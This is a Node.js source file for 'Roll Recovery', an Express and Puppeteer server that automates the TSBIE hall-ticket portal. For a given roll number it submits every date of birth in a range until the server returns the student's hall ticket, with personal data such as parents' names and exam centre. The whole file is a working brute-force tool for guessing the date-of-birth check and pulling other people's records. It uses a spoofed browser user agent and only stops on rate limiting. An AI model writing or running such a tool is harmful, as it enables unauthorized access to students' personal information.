/**
 * Roll Recovery v2.0 — Server
 * Express + Puppeteer backend with SSE streaming
 *
 * @author codewithriza
 * @license MIT
 */

const express = require('express');
const puppeteer = require('puppeteer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const TSBIE_URL = 'https://tgbieht.cgg.gov.in/SecondYrHallTickets.do';

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Active scan registry (for cancellation support)
const activeScans = new Map();

/**
 * SSE endpoint — streams scan progress to the client
 * GET /api/scan?roll=...&startDate=...&endDate=...&delay=...
 */
app.get('/api/scan', (req, res) => {
  const { roll, startDate, endDate, delay } = req.query;

  if (!roll || !startDate || !endDate) {
    return res.status(400).json({ error: 'Missing required parameters: roll, startDate, endDate' });
  }

  // SSE headers
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no',
  });

  const scanId = Date.now().toString();
  const delayMs = Math.max(0, parseInt(delay) || 100);

  const send = (event, data) => {
    try { res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`); }
    catch (_) { /* connection closed */ }
  };

  send('init', { scanId, message: 'Scan initialized' });

  let cancelled = false;
  activeScans.set(scanId, () => { cancelled = true; });
  req.on('close', () => { cancelled = true; activeScans.delete(scanId); });

  // Run scan
  (async () => {
    let browser = null;

    try {
      const start = parseDate(startDate);
      const end = parseDate(endDate);
      const totalDays = Math.round((end - start) / 86400000) + 1;

      send('status', { type: 'info', message: `Target: ${roll}` });
      send('status', { type: 'info', message: `Range: ${fmtDate(start)} → ${fmtDate(end)} (${totalDays} days)` });
      send('status', { type: 'info', message: `Delay: ${delayMs}ms` });
      send('status', { type: 'info', message: 'Launching headless browser...' });

      browser = await puppeteer.launch({
        headless: 'new',
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
      });

      const page = await browser.newPage();
      await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

      send('status', { type: 'info', message: 'Loading TSBIE portal...' });
      await page.goto(TSBIE_URL, { waitUntil: 'networkidle2', timeout: 30000 });

      // Verify form elements exist
      const formReady = await page.evaluate(() => {
        const f = document.querySelector('form');
        return !!(
          f &&
          f.querySelector('[name="ssc_exam_no"]') &&
          f.querySelector('#dob') &&
          f.querySelector('input[type="submit"][value="Get Hall Ticket"]')
        );
      });

      if (!formReady) {
        send('status', { type: 'error', message: 'Form not found. The TSBIE portal may be down.' });
        send('done', { success: false, reason: 'form_not_found' });
        return;
      }

      send('status', { type: 'success', message: 'Portal loaded. Scanning...\n' });

      let current = new Date(start);
      let count = 0;

      while (current <= end && !cancelled) {
        count++;
        const dob = fmtDate(current);

        send('attempt', {
          count,
          total: totalDays,
          dob,
          progress: Math.round((count / totalDays) * 100),
        });

        try {
          const result = await page.evaluate(async (rollNo, dobStr) => {
            const form = document.querySelector('form');
            const rollInput = form.querySelector('[name="ssc_exam_no"]');
            const dobInput = form.querySelector('#dob');
            const submitBtn = form.querySelector('input[type="submit"][value="Get Hall Ticket"]');

            rollInput.value = rollNo;
            dobInput.value = dobStr;

            // Set jQuery datepicker if available
            if (typeof $ !== 'undefined' && $.fn && $.fn.datepicker) {
              try {
                const [d, m, y] = dobStr.split('/').map(Number);
                $(dobInput).datepicker('setDate', new Date(y, m - 1, d));
              } catch (_) {}
            }

            return new Promise((resolve) => {
              let done = false;

              const onSubmit = async (e) => {
                if (done) return;
                done = true;
                e.preventDefault();
                form.removeEventListener('submit', onSubmit);

                const fd = new FormData(form);
                fd.append(submitBtn.name, submitBtn.value);

                try {
                  const resp = await fetch(form.action || window.location.href, {
                    method: form.method || 'POST',
                    body: fd,
                    credentials: 'same-origin',
                  });
                  const ct = resp.headers.get('content-type') || '';
                  const text = await resp.text();
                  resolve({ status: resp.status, contentType: ct, text, len: text.length });
                } catch (err) {
                  resolve({ status: 0, contentType: '', text: '', len: 0, error: err.message });
                }
              };

              form.addEventListener('submit', onSubmit);
              try { submitBtn.click(); } catch (_) {
                form.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
              }

              setTimeout(() => {
                if (!done) {
                  done = true;
                  form.removeEventListener('submit', onSubmit);
                  resolve({ status: 0, contentType: '', text: '', len: 0, timeout: true });
                }
              }, 15000);
            });
          }, roll, dob);

          if (result.timeout) {
            send('scan_error', { dob, message: 'Request timed out' });
          } else if (result.status === 429) {
            send('status', { type: 'error', message: 'Rate limited by server.' });
            send('done', { success: false, reason: 'rate_limited' });
            break;
          } else if (isMatch(result.text, result.contentType)) {
            send('status', { type: 'success', message: `\nMatch found! DOB: ${dob}` });
            send('found', { roll, dob, html: result.text, contentType: result.contentType });
            send('done', { success: true, dob });
            break;
          } else {
            send('fail', { dob, count });
          }
        } catch (err) {
          send('scan_error', { dob, message: String(err) });
        }

        current.setDate(current.getDate() + 1);
        if (current <= end && !cancelled) await sleep(delayMs);
      }

      if (cancelled) {
        send('status', { type: 'warning', message: 'Scan cancelled.' });
        send('done', { success: false, reason: 'cancelled' });
      } else if (current > end) {
        send('status', { type: 'warning', message: '\nScan complete — no match found in the given range.' });
        send('done', { success: false, reason: 'not_found' });
      }
    } catch (err) {
      send('scan_error', { message: err.message });
      send('status', { type: 'error', message: `Fatal: ${err.message}` });
      send('done', { success: false, reason: 'error' });
    } finally {
      if (browser) try { await browser.close(); } catch (_) {}
      activeScans.delete(scanId);
      res.end();
    }
  })();
});

/**
 * Cancel a running scan
 * POST /api/cancel/:scanId
 */
app.post('/api/cancel/:scanId', (req, res) => {
  const cancel = activeScans.get(req.params.scanId);
  if (cancel) { cancel(); res.json({ ok: true }); }
  else res.status(404).json({ error: 'Scan not found' });
});

// --- Helpers ---

/**
 * Determine if a response contains actual student data (not just the form page)
 */
function isMatch(html, contentType) {
  if (contentType && contentType.toLowerCase().includes('pdf')) return true;

  // The form page contains these elements — if present, it's NOT a match
  const isFormPage =
    html.includes('name="ssc_exam_no"') &&
    html.includes('Get Hall Ticket') &&
    html.includes('datepicker');

  // These keywords only appear on actual hall ticket data
  const studentKeywords = ['FATHER NAME', 'MOTHER NAME', 'EXAMINATION CENTRE'];
  const hasStudentData = studentKeywords.some((kw) => html.toUpperCase().includes(kw));

  if (hasStudentData) return true;
  if (isFormPage) return false;
  if (html.length > 20000) return true; // Large non-form response

  return false;
}

function fmtDate(d) {
  return `${String(d.getDate()).padStart(2, '0')}/${String(d.getMonth() + 1).padStart(2, '0')}/${d.getFullYear()}`;
}

function parseDate(str) {
  const [y, m, d] = str.split('-').map(Number);
  return new Date(y, m - 1, d);
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// --- Start ---

app.listen(PORT, () => {
  console.log(`\n  roll-recovery v2.0`);
  console.log(`  ──────────────────`);
  console.log(`  http://localhost:${PORT}`);
  console.log(`  ──────────────────\n`);
});
